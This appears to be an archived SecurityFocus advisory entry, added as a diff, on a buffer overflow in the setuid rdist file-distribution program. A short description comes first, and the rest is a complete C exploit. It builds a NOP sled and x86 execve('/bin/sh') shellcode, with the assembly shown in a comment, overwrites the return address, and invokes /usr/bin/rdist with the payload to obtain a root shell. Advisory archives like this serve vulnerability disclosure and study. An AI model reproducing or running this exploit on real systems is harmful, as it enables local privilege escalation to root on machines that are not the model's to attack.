@@ -1,0 +1,122 @@
+source: http://www.securityfocus.com/bid/129/info
+
+Rdist is a program to maintain identical copies of files over multiple hosts. It preserves the owner, group, mode, and mtime of files if possible and can update programs that are executing. Rdist reads commands from distfile to direct the updating of files and/or directories.
+
+Rdist has over time been notorious for security vulnerabilities. In this instance it is vulnerable to a buffer overrun from user supplied data. Given that rdist is setuid root in some enviroments the attacker can excecute this buffer overflow with the resulting commands they craft being executed as root.
+
+/* cut here Brian Mitchell (brian@saturn.net) */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define DEFAULT_OFFSET 50
+#define BUFFER_SIZE 256
+
+long get_esp(void)
+{
+__asm__("movl %esp,%eax\n");
+}
+
+main(int argc, char **argv)
+{
+char *buff = NULL;
+unsigned long *addr_ptr = NULL;
+char *ptr = NULL;
+
+/* so you dont have to disassemble it, here is the asm code:
+start:
+jmp endofk0dez
+realstart:
+popl %esi
+leal (%esi), %ebx
+movl %ebx, 0x0b(%esi)
+xorl %edx, %edx
+movl %edx, 7(%esi)
+movl %edx, 0x0f(%esi)
+movl %edx, 0x14(%esi)
+movb %edx, 0x19(%esi)
+xorl %eax, %eax
+movb $59, %al
+leal 0x0b(%esi), %ecx
+movl %ecx, %edx
+pushl %edx
+pushl %ecx
+pushl %ebx
+pushl %eax
+jmp bewm
+endofk0dez:
+call realstart
+.byte '/', 'b', 'i', 'n', '/', 's', 'h'
+.byte 1, 1, 1, 1
+.byte 2, 2, 2, 2
+.byte 3, 3, 3, 3
+bewm:
+.byte 0x9a, 4, 4, 4, 4, 7, 4
+*/
+
+char execshell[] =
+"\xeb\x23"
+"\x5e"
+"\x8d\x1e"
+"\x89\x5e\x0b"
+"\x31\xd2"
+"\x89\x56\x07"
+"\x89\x56\x0f"
+"\x89\x56\x14"
+"\x88\x56\x19"
+"\x31\xc0"
+"\xb0\x3b"
+"\x8d\x4e\x0b"
+"\x89\xca"
+"\x52"
+"\x51"
+"\x53"
+"\x50"
+"\xeb\x18"
+"\xe8\xd8\xff\xff\xff"
+"/bin/sh"
+"\x01\x01\x01\x01"
+"\x02\x02\x02\x02"
+"\x03\x03\x03\x03"
+"\x9a\x04\x04\x04\x04\x07\x04";
+
+int i;
+int ofs = DEFAULT_OFFSET;
+
+/* if we have a argument, use it as offset, else use default */
+if(argc == 2)
+ofs = atoi(argv[1]);
+/* print the offset in use */
+printf("Using offset of esp + %d (%x)\n", ofs, get_esp()+ofs);
+
+buff = malloc(4096);
+if(!buff)
+{
+printf("can't allocate memory\n");
+exit(0);
+}
+ptr = buff;
+/* fill start of buffer with nops */
+memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+ptr += BUFFER_SIZE-strlen(execshell);
+/* stick asm code into the buffer */
+for(i=0;i < strlen(execshell);i++)
+*(ptr++) = execshell[i];
+/* write the return addresses
+**
+** return address 4
+** ebp 4
+** register unsigned n 0
+** register char *cp 0
+** register struct syment *s 0
+**
+** total: 8
+*/
+addr_ptr = (long *)ptr;
+for(i=0;i < (8/4);i++)
+*(addr_ptr++) = get_esp() + ofs;
+ptr = (char *)addr_ptr;
+*ptr = 0;
+execl("/usr/bin/rdist", "rdist", "-d", buff, "-d", buff, NULL);
+}
+/* cut here */
